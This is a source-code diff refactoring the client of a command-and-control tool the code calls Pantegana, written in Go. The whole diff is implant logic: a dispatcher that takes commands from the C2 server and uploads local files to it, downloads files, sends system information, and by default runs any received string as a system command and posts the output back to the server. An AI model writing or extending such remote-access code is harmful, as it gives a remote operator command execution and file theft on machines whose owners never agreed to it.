@@ -2,13 +2,12 @@ package client
 
 import (
 	"log"
-	"net/http"
 	"os"
 	"strings"
 )
 
 // Middleware executes the corresponding function from the command that the Pantegana server sent
-func Middleware(client *http.Client, cmd string, host string) {
+func (c *Client) Middleware(cmd string) {
 	switch strings.Split(cmd, " ")[0] {
 	case "quit":
 		log.Println("[+] Quitting due to quit cmd from c2")
@@ -20,7 +19,7 @@ func Middleware(client *http.Client, cmd string, host string) {
 		} else {
 			localFilePath := cmdTokens[1]
 			remoteFilePath := cmdTokens[2]
-			UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
+			c.UploadFile(c.BaseURL+uploadFileURL, localFilePath, remoteFilePath)
 		}
 	case "__download__":
 		cmdTokens := strings.Split(cmd, " ")
@@ -29,14 +28,14 @@ func Middleware(client *http.Client, cmd string, host string) {
 		} else {
 			remoteFilePath := cmdTokens[1]
 			localFilePath := cmdTokens[2]
-			DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
+			c.DownloadFile(c.BaseURL+downloadFileURL+"?file="+remoteFilePath, localFilePath)
 		}
 	case "__sysinfo__":
 		log.Printf("[+] Sending system information...")
 		sysInfo := GetCurrentSysInfo()
-		SendSysInfo(client, host+sysInfoURL, sysInfo)
+		c.SendSysInfo(c.BaseURL+sysInfoURL, sysInfo)
 	default: // Just execute the cmd as a system command (example: "ls /")
-		ExecAndGetOutput(client, host+cmdOutputURL, string(cmd))
+		c.ExecAndGetOutput(c.BaseURL+cmdOutputURL, string(cmd))
 	}
-	defer client.CloseIdleConnections()
+	defer c.HTTP.CloseIdleConnections()
 }
